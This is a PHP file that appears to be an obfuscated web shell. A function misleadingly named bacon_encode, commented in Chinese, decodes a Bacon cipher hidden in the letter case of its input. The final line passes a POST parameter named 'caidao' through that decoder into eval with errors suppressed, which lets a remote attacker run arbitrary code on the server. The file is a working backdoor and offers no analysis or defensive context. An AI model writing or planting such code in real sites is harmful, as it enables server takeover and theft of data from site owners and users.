<?php   

    function bacon_encode($s)
    {  
        $KEY = 'aaaaabbbbbabbbaabbababbaaababaab';
        $ALPHABET = 'abcdefghijklmnopqrstuvwxyz';

        # create list of tuples with key_value_structure = key_letter_of_alphabet
        //$key_v用于进行beacon翻译
        for ($i=0; $i < strlen($ALPHABET); $i++) {  
            $key_v[$ALPHABET[$i]] = substr($KEY, $i, 5);
        }   

        //将输入密码的大小写模式转换为beacon编码
        $newstr = '';
        for ($i=0; $i < strlen($s); $i++) {  
             $newstr .= ctype_lower($s[$i]) ? 'a' : 'b';
        }  

        $counter = strlen($s);
        $result = ''; 
        //die(var_dump($key_v));
        while($counter > 0){
            foreach ($key_v as $key => $value) {
                if($value == substr($newstr, 0, 5)){
                    $result .= $key;  
                }
            } 
            $newstr = substr($newstr, 5);
            $counter = $counter - 5;
        }
        return $result;
    }  
?>
@eval(bacon_encode($_POST['caidao']));
?>